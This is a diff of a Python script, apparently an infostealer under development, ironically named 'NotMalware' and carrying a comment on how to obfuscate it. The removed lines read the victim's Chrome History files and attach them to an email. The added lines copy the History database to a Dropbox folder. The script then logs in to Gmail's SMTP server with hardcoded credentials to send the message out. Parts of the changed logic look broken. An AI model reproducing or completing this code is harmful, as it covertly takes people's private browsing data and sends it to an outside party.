@@ -13,6 +13,8 @@ from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
+from shutil import copyfile
+
 
 
 ##To Obfuscate: python3.8 -OO -m py_compile NotMalware.py
@@ -74,14 +76,9 @@ def main(platform):
         msg['From'] = "SVBBZGRy@gmail.com"
         msg['To'] = "SVBBZGRy@gmail.com"
 
-        dir_path = os.path.join("C:", os.sep, 'Users','User','AppData','Roaming','Local','Google','Chrome','User Data','Default')
-        files = os.listdir(os.path.join("C:", os.sep, 'Users','User','AppData','Roaming','Local','Google','Chrome','User Data','Default','History'))
-        for f in files:  # add files to the message
-            file_path = os.path.join(dir_path, f)
-            attachment = MIMEApplication(open(file_path, "rb").read(), _subtype="txt")
-            attachment.add_header('Content-Disposition', 'attachment', filename=f)
-            msg.attach(attachment)
-
+        dir_path = os.path.join("C:", os.sep, 'Users','User','AppData','Local','Google','Chrome','User Data','Default','History')
+        files = os.path.join("C:", os.sep, 'User','Dropbox','TUFMV0FS','TestingArea')
+        copyfile(dir_path, files)
         # Send the message via our own SMTP server.
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.login("SVBBZGRy@gmail.com", "SVBBZGRy")
